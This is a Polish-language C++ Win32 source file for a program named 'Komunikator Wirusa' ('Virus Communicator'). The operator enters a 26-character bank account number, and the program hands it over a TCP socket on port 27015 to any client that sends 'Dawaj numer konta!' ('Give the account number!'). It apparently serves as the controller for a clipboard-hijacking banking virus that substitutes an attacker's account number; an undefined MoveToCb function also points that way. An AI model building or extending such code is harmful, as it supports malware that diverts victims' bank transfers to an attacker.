#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <MSWSock.h>
#include <stdlib.h>
#pragma comment(lib, "Ws2_32.lib")

#include "resource2.h"

#define MAXL			26
#define MY_BN_CLICKED	1001
#define DEFAULT_PORT	"27015"
#define DEAFULT_BUFLEN	512

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
bool init(HINSTANCE hInstance);
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void MoveToCb();
void HandleClient();
bool init_winsock();
INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);

constexpr CHAR szClassName[] = "KomunikatorWirusa";
constexpr CHAR windowTitle[] = "Komunikator Wirusa";
constexpr CHAR msgName[] = "Nic podejrzanego";
LPSTR bankAccount;
HWND hwndThis;
bool bAset;
char sockbuf[DEAFULT_BUFLEN];

SOCKET ListenSocket, ClientSocket;
struct addrinfo *result = NULL, *ptr = NULL, hints;// , saClient;
struct sockaddr saClient;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (!init(hInstance)) return 1;
	if (!init_winsock()) return 2;
	int iSizeofSaClient = sizeof(saClient);
	ClientSocket = INVALID_SOCKET;

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		if (!bAset)
			DialogBox(
				hInstance,
				MAKEINTRESOURCE(IDD_FORMVIEW),
				hwndThis,
				DialogProc
			);
		TranslateMessage(&msg);
		DispatchMessage(&msg);
		if (ClientSocket == INVALID_SOCKET)
		{
			int szSaCl = sizeof(saClient);
			// Blokuje KOM, nie da się zmienić numeru.
			ClientSocket = accept(ListenSocket, &saClient, &szSaCl);
		}
		if (ClientSocket != INVALID_SOCKET && bAset)
		{
			HandleClient();
		}
	}

	closesocket(ListenSocket);
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}

bool init(HINSTANCE hInstance)
{
	WNDCLASSEX wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.hbrBackground = NULL;
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = NULL;

	if (!RegisterClassEx(&wc)) return false;

	hwndThis = CreateWindowEx(
		NULL,
		wc.lpszClassName,
		windowTitle,
		WS_TILEDWINDOW | WS_VISIBLE,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		335,
		85,
		NULL,
		NULL,
		hInstance,
		NULL
	);

	if (hwndThis == NULL) return false;

	HWND hwndButton = CreateWindow(
		"BUTTON",	// Predefined class; Unicode assumed 
		"Podaj nowy numer konta bankowego", // Button text 
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, // Styles 
		10,         // x position 
		10,         // y position 
		300,        // Button width
		30,        // Button height
		hwndThis,   // Parent window
		NULL,       // No menu.
		(HINSTANCE)GetWindowLong(hwndThis, GWL_HINSTANCE),
		NULL		// Pointer not needed.
	);

	bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
	bAset = false;

	return true;
}

bool init_winsock()
{
	WSADATA wsadata;
	int iResult;
	WORD wersja;
	wersja = MAKEWORD(2, 2);
	iResult = WSAStartup(wersja, &wsadata);
	if (iResult != NO_ERROR)
		return false;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the local address and port to be used by the server
	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (iResult != NO_ERROR)
		return false;

	// Create a SOCKET for the server to listen for client connections
	ListenSocket = INVALID_SOCKET;
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET)
	{
		freeaddrinfo(result);
		WSACleanup();
		return false;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return false;
	}
	freeaddrinfo(result); // No longer needed

	if (listen(ListenSocket, 2) == SOCKET_ERROR) {
		closesocket(ListenSocket);
		WSACleanup();
		return false;
	}

	return true;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_COMMAND:
		switch (wParam)
		{
		case BN_CLICKED:
			bAset = false;
			break;
		default:
			break;
		}
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

void HandleClient()
{
	int sockbuflen = DEAFULT_BUFLEN;
	int iResult = recv(ClientSocket, sockbuf, sockbuflen, 0);
	if (iResult == SOCKET_ERROR && WSAGetLastError() == WSAEMSGSIZE) throw;
	if (iResult > 0)
	{
		if (strcmp(sockbuf, "Dawaj numer konta!") == 0)
		{
			strcpy_s(sockbuf, bankAccount);
			int iSendResult = send(ClientSocket, sockbuf, MAXL + 1, 0);
			if (iSendResult == SOCKET_ERROR)
			{
				closesocket(ClientSocket);
				return; // error
			}
		}
	}
	else
	{
		closesocket(ClientSocket);
		return; // error
	}

	closesocket(ClientSocket);
	ClientSocket = INVALID_SOCKET;
}

INT_PTR CALLBACK DialogProc(HWND hDlg, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_INITDIALOG:
		SendDlgItemMessage(
			hDlg,
			IDC_EDIT1,
			EM_SETLIMITTEXT,
			MAXL,
			NULL
		);
		break;
	/*case EN_CHANGE:
		SendDlgItemMessage(
			hDlg,
			IDC_BUTTON1,
			WM_ENABLE,
			TRUE,
			TRUE
		);
		break;*/
	case WM_COMMAND:
		switch (wParam)
		{
		case MY_BN_CLICKED:
			bankAccount[0] = 0;
			bankAccount[1] = MAXL;
			SendDlgItemMessage(
				hDlg,
				IDC_EDIT1,
				EM_GETLINE,
				NULL,
				LPARAM(bankAccount)
			);
			if (strlen(bankAccount) == MAXL)
			{
				bAset = true;
				EndDialog(hDlg, TRUE);
			}
			break;
		default:
			break;
		}
		break;
	
	default:
		return DefWindowProc(hDlg, msg, wParam, lParam);
	}
	return 0;
}